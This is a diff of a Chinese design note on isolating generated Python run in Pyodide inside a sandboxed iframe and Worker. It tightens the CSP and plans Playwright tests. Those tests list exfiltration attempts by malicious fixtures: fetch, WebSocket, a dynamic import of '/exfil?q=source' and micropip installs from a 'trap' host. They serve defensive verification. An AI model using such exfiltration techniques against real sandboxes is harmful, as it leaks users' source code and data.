@@ -30,7 +30,7 @@ G1 资产供应：在构建时获取并校验 Pyodide JS/WASM/stdlib zip、distr
 
 iframe 使用 `sandbox='allow-scripts allow-same-origin'`，仅因独立无凭据站点才允许 same-origin，以创建 module Worker；禁止 top-navigation/popups/forms。app 仅与事先捕获的 iframe.contentWindow、精确执行站点 origin 建立一次 channel，后续仅处理私有 port；外部 window message 不能触发 Verify。iframe 自身不读取 app DOM，generated Python 只在 worker 执行。替换 iframe / 包后关 port 与 Worker。
 
-worker **自身 HTTP 响应** CSP：`default-src 'none'; script-src 'self' 'wasm-unsafe-eval'; connect-src 'none'; worker-src 'none'`；frame CSP 同样 connect-src none，仅允许平台 module Worker。不使用 blob Worker 绕开 HTTP CSP。必须为 Pyodide 提供预加载本地资产的离线 loader：WASM 用已核验 bytes instantiate，stdlib / wheel 从 bytes 进入 FS；若库仍需 fetch，则仅内存固定清单的只读 loader，不发送实际 HTTP、不接受动态 URL。修改 JS fetch 本身不构成隔离；浏览器 CSP 是最终网络拒绝边界，真实浏览器必须验证。
+worker **自身 HTTP 响应** CSP：`default-src 'none'; script-src 'wasm-unsafe-eval'; connect-src 'none'; worker-src 'none'`；Worker/Pyodide bootstrap 是构建时内联单 bundle，不运行任何运行时 JS import。删除 worker script-src self 是必要条件：connect-src none 不限制 dynamic import，同来源可带query泄漏源码。frame CSP 同样 connect-src none，仅允许平台 module Worker。不使用 blob Worker 绕开 HTTP CSP。必须为 Pyodide 提供预加载本地资产的离线 loader：WASM 用已核验 bytes instantiate，stdlib / wheel 从 bytes 进入 FS；若库仍需 fetch，则仅内存固定清单的只读 loader，不发送实际 HTTP、不接受动态 URL。修改 JS fetch 本身不构成隔离；浏览器 CSP 是最终网络拒绝边界，真实浏览器必须验证。
 
 根据 [MDN Worker/CSP](https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Using_web_workers#content_security_policy)，Worker 可联网且其响应的 CSP 才约束 Worker；[Pyodide Worker](https://pyodide.org/en/stable/usage/webworker.html) 只证明可在后台执行。spike 目前从 CDN 动态 import、安装 micropip/Mesa，且 Worker 使用应用来源，**没有满足本边界**。若离线 loader 与该 CSP 不能实际运行，阻止 ready，不回退到允许任意 CDN/PyPI 网络。
 
@@ -44,7 +44,7 @@ worker **自身 HTTP 响应** CSP：`default-src 'none'; script-src 'self' 'wasm
 
 新增真实 Playwright 驱动，不 stub Worker、不 route fulfill 伪造 Pyodide；启动两个本地 HTTP server 代表 app/execution，并第三个 trap server 记录连接。真实 production frame/worker 与真实固定 Pyodide bytes必须进入页面。测试命令计划为 `node services/browser-preview/runtime/browser-acceptance.mjs`，程序自行启动端口并选择 CHROMIUM_PATH。代码未交付时不得把该命令写为已通过。
 
-逐个独立 Worker 加载恶意 model fixture：`import js` 后 fetch(app API/trap)、XMLHttpRequest、WebSocket、EventSource、动态 import、subworker、`micropip.install('https://trap/...whl')`；断言 trap 与 app 服务端访问日志没有到达请求，CSP violation / 明确拒绝记录与实际输出相符。不禁止 import js 来掩盖测试。还要从 frame 尝试读取 parent DOM/cookies；外部 frame 向 host 伪造结果与 Verify 消息；读取另一项目包；篡改 manifest/source；旧 requestId/packageIdentity；输出超限；无限循环超时；运行期间取消。检查 timeout/cancel 后下一有效 Queue/Mesa run 仍能成功且旧 trace 不显示。
+逐个独立 Worker 加载恶意 model fixture：`import js` 后 fetch(app API/trap)、XMLHttpRequest、WebSocket、EventSource、动态 import（包括执行站点自身 `/exfil?q=source`，验证 script-src 也产生零请求）、subworker、`micropip.install('https://trap/...whl')`；断言 trap 与 app 服务端访问日志没有到达请求，CSP violation / 明确拒绝记录与实际输出相符。不禁止 import js 来掩盖测试。还要从 frame 尝试读取 parent DOM/cookies；外部 frame 向 host 伪造结果与 Verify 消息；读取另一项目包；篡改 manifest/source；旧 requestId/packageIdentity；输出超限；无限循环超时；运行期间取消。检查 timeout/cancel 后下一有效 Queue/Mesa run 仍能成功且旧 trace 不显示。
 
 正向真实 Mesa grid / stdlib Queue lane 都通过同一 runtime/renderer，seed 两边界和 steps 普通参数，browser 与 server 重跑 snapshot/metrics 可对照；所有网络按 server log 与 browser request日志双核对。运行窗口不得新增 LLM/Simulation/Project execution；显式 Verify 单独窗口计数并忽略 browser伪造指标。保存 JSON trace、CSP/请求日志、server trap counters 和 screenshots，计算 SHA256SUMS。两端口仅是本地开发可运行拓扑，线上独立站点配置仍需单独证据。
 
